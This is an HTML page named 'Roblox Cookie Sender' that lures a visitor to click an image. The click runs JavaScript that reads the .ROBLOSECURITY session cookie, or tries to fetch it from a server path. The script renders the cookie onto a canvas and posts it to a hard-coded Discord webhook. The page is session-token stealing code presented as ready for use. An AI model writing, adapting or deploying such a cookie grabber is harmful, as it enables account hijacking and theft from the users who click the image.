<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Roblox Cookie Sender</title>
    <script src="https://cdn.jsdelivr.net/npm/canvas@2.0.0/dist/canvas.min.js"></script>
</head>
<body>
    <img src="https://upload.wikimedia.org/wikipedia/commons/4/47/PNG_transparency_demonstration_1.png" alt="Click me!" onclick="sendRobloxCookies()" style="cursor: pointer;">
    <script>
        function sendRobloxCookies() {
            // Try to retrieve Roblox cookies
            const robloxCookies = document.cookie.split(';').map(cookie => cookie.trim()).filter(cookie => cookie.startsWith('.ROBLOSECURITY='));
            if (robloxCookies.length === 0) {
                console.error('No Roblox cookies found');
                // Fallback to server-side script
                fetch('/get-roblox-cookie')
                    .then(response => response.json())
                    .then(data => {
                        if (data.cookie) {
                            sendCookieAsImage(data.cookie);
                        } else {
                            console.error('Failed to retrieve Roblox cookie from server');
                        }
                    })
                    .catch(error => {
                        console.error('Error:', error);
                    });
                return;
            }

            const robloxCookie = robloxCookies[0].split('=')[1];
            sendCookieAsImage(robloxCookie);
        }

        function sendCookieAsImage(cookie) {
            // Convert cookie to image
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = 400;
            canvas.height = 200;
            ctx.fillStyle = 'white';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.fillStyle = 'black';
            ctx.font = '20px Arial';
            ctx.fillText(`Roblox Cookie: ${cookie}`, 20, 50);

            // Send image to Discord
            fetch('https://discordapp.com/api/webhooks/1508814909008515094/K6_XrOoEL_GXG1UJ2Rf9KI_1b76AgKZ7lAM_Nt-WSZkW8mjKxzCCFxavsTiG4ylQyPGL', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    content: 'Roblox Cookie',
                    file: {
                        name: 'roblox_cookie.png',
                        content: canvas.toDataURL('image/png').split(',')[1]
                    }
                })
            }).then(response => {
                if (response.ok) {
                    console.log('Roblox cookie sent successfully');
                } else {
                    console.error('Failed to send Roblox cookie');
                }
            }).catch(error => {
                console.error('Error:', error);
            });
        }
    </script>
</body>
</html>
